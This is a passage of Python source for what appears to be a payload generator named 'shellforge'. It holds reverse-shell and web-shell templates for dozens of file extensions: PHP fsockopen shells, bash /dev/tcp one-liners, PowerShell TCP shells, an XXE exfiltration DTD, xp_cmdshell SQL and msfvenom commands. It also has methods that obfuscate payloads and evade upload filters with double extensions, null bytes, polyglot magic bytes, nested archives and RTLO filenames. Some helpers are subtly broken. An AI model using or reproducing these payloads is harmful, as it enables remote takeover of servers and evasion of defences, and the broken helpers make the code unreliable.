                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'jpeg': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'gif': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'bmp': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'svg': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'ico': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'webp': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            
            # Document Extensions
            'pdf': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'doc': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'docx': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'xls': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'xlsx': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'ppt': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'pptx': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'odt': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'ods': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'odp': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'txt': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'rtf': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            
            # Archive Extensions
            'zip': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'rar': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'tar': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'gz': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            '7z': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'bz2': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            
            # Programming Language Extensions
            'py': {
                'reverse': 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])',
                'basic': 'import os;os.system("whoami")'
            },
            'rb': {
                'reverse': 'require "socket";exit if fork;c=TCPSocket.new("{host}",{port});loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts "failed: #{{$_}}"}}',
                'basic': 'system("whoami")'
            },
            'pl': {
                'reverse': 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};',
                'basic': 'system("whoami");'
            },
            'js': {
                'reverse': 'require("child_process").exec("/bin/bash -c \'bash -i >& /dev/tcp/{host}/{port} 0>&1\'");',
                'basic': 'require("child_process").exec("whoami");'
            },
            'go': {
                'reverse': 'package main;import("os/exec";"net");func main(){{c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
                'basic': 'package main;import("os/exec");func main(){{exec.Command("whoami").Run()}}'
            },
            'java': {
                'reverse': 'import java.io.*;import java.net.*;public class Shell{{public static void main(String[] args)throws Exception{{Socket s=new Socket("{host}",{port});Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}}p.destroy();s.close();}}}}',
                'basic': 'Runtime.getRuntime().exec("whoami");'
            },
            
            # Shell Script Extensions
            'sh': {
                'reverse': '#!/bin/sh\nbash -i >& /dev/tcp/{host}/{port} 0>&1',
                'basic': '#!/bin/sh\nwhoami'
            },
            'bash': {
                'reverse': '#!/bin/bash\nbash -i >& /dev/tcp/{host}/{port} 0>&1',
                'basic': '#!/bin/bash\nwhoami'
            },
            'zsh': {
                'reverse': '#!/bin/zsh\nzsh -i >& /dev/tcp/{host}/{port} 0>&1',
                'basic': '#!/bin/zsh\nwhoami'
            },
            'ksh': {
                'reverse': '#!/bin/ksh\nksh -i >& /dev/tcp/{host}/{port} 0>&1',
                'basic': '#!/bin/ksh\nwhoami'
            },
            'csh': {
                'reverse': '#!/bin/csh\n(bash -i >& /dev/tcp/{host}/{port} 0>&1 &)',
                'basic': '#!/bin/csh\nwhoami'
            },
            'fish': {
                'reverse': '#!/usr/bin/fish\nbash -i >& /dev/tcp/{host}/{port} 0>&1',
                'basic': '#!/usr/bin/fish\nwhoami'
            },
            
            # Windows Extensions
            'bat': {
                'reverse': '@echo off\npowershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\'PS \'+(`pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
                'basic': '@echo off\nwhoami'
            },
            'cmd': {
                'reverse': '@echo off\npowershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\'PS \'+(`pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
                'basic': '@echo off\nwhoami'
            },
            'ps1': {
                'reverse': '$client=New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(`pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
                'basic': 'whoami'
            },
            'vbs': {
                'reverse': 'Set objShell=CreateObject("WScript.Shell")\nobjShell.Run "powershell -nop -c ""$client=New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\'PS \'+(`pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""',
                'basic': 'Set objShell=CreateObject("WScript.Shell")\nobjShell.Run "whoami"'
            },
            'exe': {
                'reverse': '# Binary reverse shell - use msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST={host} LPORT={port} -f exe',
                'basic': '# Binary executable'
            },
            'dll': {
                'reverse': '# DLL reverse shell - use msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST={host} LPORT={port} -f dll',
                'basic': '# Dynamic Link Library'
            },
            
            # Web Config Extensions
            'htaccess': {
                'reverse': 'AddType application/x-httpd-php .png\nphp_value auto_prepend_file "<?php $sock=fsockopen(\'{host}\',{port});exec(\'/bin/sh -i <&3 >&3 2>&3\'); ?>"',
                'basic': 'AddType application/x-httpd-php .png'
            },
            'config': {
                'reverse': '<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n  <system.webServer>\n    <handlers>\n      <add name="PHP" path="*.png" verb="*" modules="FastCgiModule" scriptProcessor="C:\\php\\php-cgi.exe" resourceType="Unspecified" />\n    </handlers>\n  </system.webServer>\n</configuration>',
                'basic': '<?xml version="1.0" encoding="UTF-8"?>\n<configuration></configuration>'
            },
            
            # Mobile Extensions
            'apk': {
                'reverse': '# Android APK reverse shell - use msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o shell.apk',
                'basic': '# Android Application Package'
            },
            'ipa': {
                'reverse': '# iOS IPA reverse shell - manual creation required',
                'basic': '# iOS Application Archive'
            },
            
            # Other Common Extensions
            'xml': {
                'reverse': '<?xml version="1.0"?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM "http://{host}:{port}/shell.dtd">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>',
                'basic': '<?xml version="1.0"?>\n<root></root>'
            },
            'json': {
                'reverse': '{{"exploit":"<?php $sock=fsockopen(\'{host}\',{port});exec(\'/bin/sh -i <&3 >&3 2>&3\'); ?>"}}',
                'basic': '{{"data":"value"}}'
            },
            'csv': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': 'column1,column2,column3'
            },
            'sql': {
                'reverse': "EXEC xp_cmdshell 'powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient(\\''{host}\\',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\\'PS \\'+(\\`pwd).Path+\\'>  \\';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"'",
                'basic': 'SELECT * FROM users;'
            },
            'html': {
                'reverse': '<!DOCTYPE html>\n<html>\n<body>\n<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>\n</body>\n</html>',
                'basic': '<!DOCTYPE html>\n<html>\n<body>Hello World</body>\n</html>'
            },
            'htm': {
                'reverse': '<!DOCTYPE html>\n<html>\n<body>\n<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>\n</body>\n</html>',
                'basic': '<!DOCTYPE html>\n<html>\n<body>Hello World</body>\n</html>'
            },
            'shtml': {
                'reverse': '<!DOCTYPE html>\n<html>\n<body>\n<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>\n</body>\n</html>',
                'basic': '<!DOCTYPE html>\n<html>\n<body>Hello World</body>\n</html>'
            },
            'phtml': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php echo "Hello World"; ?>'
            },
            'php3': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'php4': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'php5': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'php7': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'phps': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'phar': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            }
        }
    
    def _obfuscate_base64(self, text: str) -> str:
        """Base64 obfuscation"""
        return base64.b64encode(text.encode()).decode()
    
    def _obfuscate_hex(self, text: str) -> str:
        """Hex obfuscation"""
        return text.encode().hex()
    
    def _obfuscate_reverse(self, text: str) -> str:
        """Reverse string obfuscation"""
        return text[::-1]
    
    def _obfuscate_xor(self, text: str, key: str = "shellforge") -> str:
        """XOR obfuscation"""
        result = ""
        for i, char in enumerate(text):
            result += chr(ord(char) ^ ord(key[i % len(key)]))
        return result
    
    def _obfuscate_rot13(self, text: str) -> str:
        """ROT13 obfuscation"""
        return text.encode('rot13')
    
    def _obfuscate_mixed(self, text: str) -> str:
        """Mixed obfuscation (combination of methods)"""
        methods = [self._obfuscate_base64, self._obfuscate_hex, self._obfuscate_reverse]
        method = random.choice(methods)
        return method(text)
    
    def _encode_url(self, text: str) -> str:
        """URL encoding"""
        import urllib.parse
        return urllib.parse.quote(text)
    
    def _encode_html(self, text: str) -> str:
        """HTML encoding"""
        import html
        return html.escape(text)
    
    def _encode_unicode(self, text: str) -> str:
        """Unicode encoding"""
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    def _encode_binary(self, text: str) -> str:
        """Binary encoding"""
        return ' '.join(format(ord(c), '08b') for c in text)
    
    # =================== 2025 ADVANCED OBFUSCATION METHODS ===================
    
    def _obfuscate_aes_style(self, text: str) -> str:
        """AES-style obfuscation (simulated with base64 + XOR)"""
        # Double layer: XOR then Base64
        xor_result = self._obfuscate_xor(text)
        return base64.b64encode(xor_result.encode()).decode()
    
    def _obfuscate_gzip_style(self, text: str) -> str:
        """GZIP-style compression simulation"""
        import zlib
        compressed = zlib.compress(text.encode())
        return base64.b64encode(compressed).decode()
    
    def _obfuscate_double_encode(self, text: str) -> str:
        """Double base64 encoding"""
        first = base64.b64encode(text.encode()).decode()
        second = base64.b64encode(first.encode()).decode()
        return second
    
    def _obfuscate_unicode_escape(self, text: str) -> str:
        """Unicode escape sequences"""
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    def _obfuscate_char_encode(self, text: str) -> str:
        """Character code encoding for PHP"""
        chars = ','.join(str(ord(c)) for c in text)
        return f'eval(implode(array_map("chr",array({chars}))))'
    
    def _obfuscate_variable_chain(self, text: str) -> str:
        """Variable chain obfuscation"""
        # Split into chunks and assign to variables
        chunks = [text[i:i+5] for i in range(0, len(text), 5)]
        vars_code = []
        for i, chunk in enumerate(chunks):
            vars_code.append(f'$x{i}="{chunk}";')
        concat = '+'.join(f'$x{i}' for i in range(len(chunks)))
        return ''.join(vars_code) + f'eval({concat});'
    
    def _obfuscate_zero_width(self, text: str) -> str:
        """Zero-width character obfuscation"""
        # Insert zero-width spaces
        zwsp = '\u200b'
        return zwsp.join(text)
    
    def _obfuscate_polymorphic(self, text: str) -> str:
        """Polymorphic obfuscation - changes each time"""
        methods = [self._obfuscate_base64, self._obfuscate_hex, self._obfuscate_xor]
        chosen = random.choice(methods)
        result = chosen(text)
        # Add random comments
        comment = ''.join(random.choices(string.ascii_letters, k=10))
        return f'/*{comment}*/{result}'
    
    # =================== BYPASS METHODS ===================
    
    def _bypass_double_extension(self, filename: str, shell_content: str) -> tuple:
        """Double extension bypass (e.g., shell.php.png)"""
        base = filename.rsplit('.', 1)[0]
        ext = filename.rsplit('.', 1)[1] if '.' in filename else 'php'
        new_name = f"{base}.php.{ext}"
        return new_name, shell_content
    
    def _bypass_null_byte(self, filename: str, shell_content: str) -> tuple:
        """Null byte injection (shell.php%00.png)"""
        base = filename.rsplit('.', 1)[0]
        ext = filename.rsplit('.', 1)[1] if '.' in filename else 'png'
        new_name = f"{base}.php%00.{ext}"
        return new_name, shell_content
    
    def _bypass_case_manipulation(self, filename: str, shell_content: str) -> tuple:
        """Case manipulation (ShElL.PhP)"""
        base = filename.rsplit('.', 1)[0]
        ext = filename.rsplit('.', 1)[1] if '.' in filename else 'php'
        # Randomize case
        new_ext = ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in ext)
        new_name = f"{base}.{new_ext}"
        return new_name, shell_content
    
    def _bypass_special_chars(self, filename: str, shell_content: str) -> tuple:
        """Special character injection (shell.ph%20p, shell.ph\x00p)"""
        base = filename.rsplit('.', 1)[0]
        new_name = f"{base}.ph%20p"
        return new_name, shell_content
    
    def _bypass_content_type(self, filename: str, shell_content: str) -> tuple:
        """Content-Type spoofing - adds fake image header"""
        if filename.endswith('.png'):
            # Add PNG magic bytes
            header = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
            return filename, header.decode('latin-1') + '\n' + shell_content
        elif filename.endswith('.jpg') or filename.endswith('.jpeg'):
            # Add JPEG magic bytes
            header = b'\xff\xd8\xff\xe0\x00\x10JFIF'
            return filename, header.decode('latin-1') + '\n' + shell_content
        elif filename.endswith('.gif'):
            # Add GIF magic bytes
            header = b'GIF89a'
            return filename, header.decode('latin-1') + '\n' + shell_content
        elif filename.endswith('.pdf'):
            # Add PDF magic bytes
            header = '%PDF-1.4\n'
            return filename, header + shell_content
        else:
            return filename, shell_content
    
    def _bypass_polyglot(self, filename: str, shell_content: str) -> tuple:
        """Create polyglot file (valid image + PHP)"""
        ext = filename.rsplit('.', 1)[1] if '.' in filename else 'png'
        
        if ext in ['png', 'jpg', 'jpeg', 'gif']:
            # Create a valid image header + PHP shell
            if ext == 'png':
                header = '\\x89PNG\\r\\n\\x1a\\n'
            elif ext in ['jpg', 'jpeg']:
                header = '\\xff\\xd8\\xff\\xe0'
            else:  # gif
                header = 'GIF89a'
            
            polyglot = f"{header}\n{shell_content}"
            return filename, polyglot
        else:
            return filename, shell_content
    
    def _bypass_zip_in_zip(self, filename: str, shell_content: str) -> tuple:
        """Create nested ZIP: outer.zip contains inner.zip contains shell"""
        try:
            # Create inner zip with shell
            inner_zip = io.BytesIO()
            with zipfile.ZipFile(inner_zip, 'w', zipfile.ZIP_DEFLATED) as inner:
                shell_name = filename.replace('.zip', '.php')
                inner.writestr(shell_name, shell_content)
            
            # Create outer zip containing inner zip
            outer_zip = io.BytesIO()
            with zipfile.ZipFile(outer_zip, 'w', zipfile.ZIP_DEFLATED) as outer:
                outer.writestr('payload.zip', inner_zip.getvalue())
            
            return filename, outer_zip.getvalue()
        except Exception as e:
            return filename, shell_content
    
    def _bypass_nested_archive(self, filename: str, shell_content: str) -> tuple:
        """Create deeply nested archive (zip->zip->zip->shell)"""
        try:
            # Start with shell
            current_content = shell_content.encode() if isinstance(shell_content, str) else shell_content
            shell_name = filename.replace('.zip', '.php')
            
            # Create 3 levels of nesting
            for level in range(3):
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                    name = shell_name if level == 0 else f'level{level}.zip'
                    zf.writestr(name, current_content)
                current_content = zip_buffer.getvalue()
            
            return filename, current_content
        except Exception as e:
            return filename, shell_content
    
    def _bypass_magic_bytes(self, filename: str, shell_content: str) -> tuple:
        """Add proper magic bytes based on extension"""
        magic_bytes = {
            'png': b'\\x89PNG\\r\\n\\x1a\\n',
            'jpg': b'\\xff\\xd8\\xff\\xe0',
            'jpeg': b'\\xff\\xd8\\xff\\xe0',
            'gif': b'GIF89a',
            'pdf': b'%PDF-1.4\\n',
            'zip': b'PK\\x03\\x04',
            'rar': b'Rar!\\x1a\\x07',
            'doc': b'\\xd0\\xcf\\x11\\xe0\\xa1\\xb1\\x1a\\xe1',
            'docx': b'PK\\x03\\x04',
            'xls': b'\\xd0\\xcf\\x11\\xe0\\xa1\\xb1\\x1a\\xe1',
            'xlsx': b'PK\\x03\\x04'
        }
        
        ext = filename.rsplit('.', 1)[1] if '.' in filename else 'php'
        if ext in magic_bytes:
            header = magic_bytes[ext].decode('unicode_escape')
            return filename, header + '\\n' + shell_content
        return filename, shell_content
    
    def _bypass_rtlo(self, filename: str, shell_content: str) -> tuple:
        """Right-to-Left Override bypass (shell<RTLO>gnp.php = shell.php visually)"""
        # U+202E is RTLO character
        rtlo = '\\u202e'
        base = filename.rsplit('.', 1)[0]
        # Makes "shell<RTLO>gnp.php" appear as "shell.php" but actually "shellphp.png"
        new_name = f"{base}{rtlo}gnp.php"
        return new_name, shell_content
    
    def _bypass_unicode_homoglyph(self, filename: str, shell_content: str) -> tuple:
        """Unicode homoglyph bypass (use similar looking characters)"""
        # Replace 'p' with 'р' (Cyrillic), 'h' with 'һ', etc.
        homoglyphs = {
            'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р', 'c': 'с',
            'x': 'х', 'y': 'у', 'h': 'һ', 's': 'ѕ'
        }
        
        new_name = ''
        for char in filename:
            new_name += homoglyphs.get(char.lower(), char)
        
        return new_name, shell_content
    
    def generate_shell(self, extension: str, template_type: str = 'basic', 
                      command: str = 'whoami', obfuscate: Optional[str] = None,
                      encode: Optional[str] = None, custom_params: Dict = None,
                      bypass: Optional[str] = None) -> str:
        """
        Generate shell for specified extension
        
        Args:
            extension: File extension (php, asp, jsp, etc.)
            template_type: Type of shell template to use
            command: Command to execute
            obfuscate: Obfuscation method (all 2025 methods supported)
            encode: Encoding method (url, html, unicode, binary)
            custom_params: Custom parameters for template
            bypass: Bypass method (double_extension, null_byte, polyglot, zip_in_zip, etc.)
        
        Returns:
            Generated shell code (or tuple with modified filename if bypass used)
        """
        if extension not in self.templates:
            raise ValueError(f"Extension '{extension}' not supported")
        
        if template_type not in self.templates[extension]:
            available_types = list(self.templates[extension].keys())
            raise ValueError(f"Template type '{template_type}' not found for {extension}. Available: {available_types}")
        
        # Get base template
        shell = self.templates[extension][template_type]
        
        # Replace host and port placeholders
        if '{host}' in shell or '{port}' in shell:
            # Extract host and port from command if present
            if '{host}=' in command and '{port}=' in command:
                parts = command.split(',')
                host = parts[0].split('=')[1] if '=' in parts[0] else '127.0.0.1'
                port = parts[1].split('=')[1] if '=' in parts[1] else '4444'
                shell = shell.replace('{host}', host)
                shell = shell.replace('{port}', port)
            elif custom_params:
                shell = shell.replace('{host}', custom_params.get('host', '127.0.0.1'))
                shell = shell.replace('{port}', str(custom_params.get('port', '4444')))
        
        # Replace command placeholder
        if '{cmd}' in shell:
            shell = shell.replace('{cmd}', command)
        
        # Replace custom parameters
        if custom_params:
            for key, value in custom_params.items():
                shell = shell.replace(f'{{{key}}}', str(value))
        
        # Apply obfuscation if requested
        if obfuscate:
            if obfuscate in self.obfuscation_methods:
                shell = self.obfuscation_methods[obfuscate](shell)
            else:
                raise ValueError(f"Obfuscation method '{obfuscate}' not supported. Available: {list(self.obfuscation_methods.keys())}")
        
        # Apply encoding if requested
        if encode:
            if encode in self.encoding_methods:
                shell = self.encoding_methods[encode](shell)
            else:
                raise ValueError(f"Encoding method '{encode}' not supported. Available: {list(self.encoding_methods.keys())}")
        
        # Store bypass method for save_shell to use
        if bypass:
            if bypass not in self.bypass_methods:
                raise ValueError(f"Bypass method '{bypass}' not supported. Available: {list(self.bypass_methods.keys())}")
            # Return tuple with bypass indicator
            return (shell, bypass)
        
        return shell
    
    def list_extensions(self) -> List[str]:
        """List all supported extensions"""
        return list(self.templates.keys())
    
    def list_templates(self, extension: str) -> List[str]:
        """List available templates for an extension"""
        if extension not in self.templates:
            raise ValueError(f"Extension '{extension}' not supported")
        return list(self.templates[extension].keys())
    
    def get_template_info(self, extension: str, template_type: str) -> Dict:
        """Get information about a specific template"""
        if extension not in self.templates:
            raise ValueError(f"Extension '{extension}' not supported")
        
        if template_type not in self.templates[extension]:
            available_types = list(self.templates[extension].keys())
            raise ValueError(f"Template type '{template_type}' not found for {extension}. Available: {available_types}")
        
        template = self.templates[extension][template_type]
        
        return {
            'extension': extension,
            'template_type': template_type,
            'description': self._get_template_description(extension, template_type),
            'complexity': self._get_template_complexity(template),
            'stealth_level': self._get_stealth_level(template_type),
            'example_usage': self._get_example_usage(extension, template_type)
        }
    
    def _get_template_description(self, extension: str, template_type: str) -> str:
        """Get template description"""
        descriptions = {
            'php': {
                'basic': 'Basic PHP shell with system() function',
                'stealth': 'Stealth PHP shell using POST parameters',
                'weevely': 'Weevely-style PHP shell with base64 decoding',
                'preg_replace': 'PHP shell using preg_replace with /e modifier',
                'assert': 'PHP shell using assert() function',
                'create_function': 'PHP shell using create_function()',
                'backticks': 'PHP shell using backticks execution',
                'exec': 'PHP shell using exec() function',
                'shell_exec': 'PHP shell using shell_exec() function',
                'passthru': 'PHP shell using passthru() function',
                'system': 'PHP shell using system() function',
                'popen': 'PHP shell using popen() function',
                'proc_open': 'PHP shell using proc_open() function',
                'expect': 'PHP shell using expect_popen() function',
                'pcntl': 'PHP shell using pcntl_exec() function',
                'curl': 'PHP shell using cURL',
                'file_get_contents': 'PHP shell using file_get_contents()',
                'include': 'PHP shell using include()',
                'require': 'PHP shell using require()',
                'eval': 'PHP shell using eval()',
                'file': 'PHP shell using readfile()',
                'fopen': 'PHP shell using fopen() and fread()',
                'highlight_file': 'PHP shell using highlight_file()',
                'show_source': 'PHP shell using show_source()',
                'phpinfo': 'PHP shell displaying phpinfo()',
                'apache': 'PHP shell using apache_get_modules()',
                'ini_get': 'PHP shell using ini_get_all()',
                'getenv': 'PHP shell displaying environment variables',
                'server': 'PHP shell displaying server variables',
                'session': 'PHP shell displaying session variables',
                'cookie': 'PHP shell displaying cookie variables',
                'post': 'PHP shell displaying POST variables',
                'get': 'PHP shell displaying GET variables',
                'request': 'PHP shell displaying request variables',
                'files': 'PHP shell displaying file upload variables',
                'GLOBALS': 'PHP shell displaying all global variables',
                'backdoor': 'PHP backdoor with password protection',
                'bypass': 'PHP shell using string concatenation bypass',
                'concat': 'PHP shell using character concatenation',
                'variable': 'PHP shell using variable variables',
                'array': 'PHP shell using array functions',
                'object': 'PHP shell using object-oriented approach',
                'reflection': 'PHP shell using reflection API',
                'callback': 'PHP shell using callback functions',
                'filter': 'PHP shell using filter functions',
                'iterator': 'PHP shell using iterator patterns',
                'generator': 'PHP shell using generator functions',
                'closure': 'PHP shell using closures',
                'anonymous': 'PHP shell using anonymous functions',
                'bind': 'PHP shell using closure binding',
                'pipe': 'PHP shell using pipe functions',
                'ssh2': 'PHP shell using SSH2 extension',
                'ftp': 'PHP shell using FTP functions',
                'smtp': 'PHP shell using mail functions',
                'imap': 'PHP shell using IMAP functions',
                'ldap': 'PHP shell using LDAP functions',
                'mongodb': 'PHP shell using MongoDB driver',
                'redis': 'PHP shell using Redis extension',
